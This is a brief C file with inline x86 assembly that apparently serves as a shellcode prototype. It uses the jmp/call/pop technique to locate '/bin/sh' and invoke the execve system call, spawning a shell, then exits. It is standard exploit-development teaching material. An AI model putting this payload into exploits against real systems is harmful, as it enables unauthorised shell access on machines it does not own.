void
main()
{
	__asm__(
		"jmp	_L1\n"

		"_L0:\n"
		"\tpopl	%esi\n"

		"\tmov  $0xb,%eax\n"		/* sysscall: sys_execve */
		"\tmov  %esi,%ebx\n"		/* p1: "/bin/sh" */
		"\tlea  _C0,%ecx\n"		/* p2: &argv */
		"\tmov  $0x0,%edx\n"		/* p3: NULL */
		"\tint  $0x80\n"		/* and GO! */

		"\tmov	$0x1,%eax\n"		/* syscall: sys_exit */
		"\tmov  $0x0,%ebx\n"		/* p1: 0 */
		"\tint  $0x80\n"		/* and DONE! */

		"_L1:\n"
		"\tcall	_L0\n"

		".asciz \"/bin/sh\"\n"
		"_C0:\n"
		".int 0\n"
	);
}
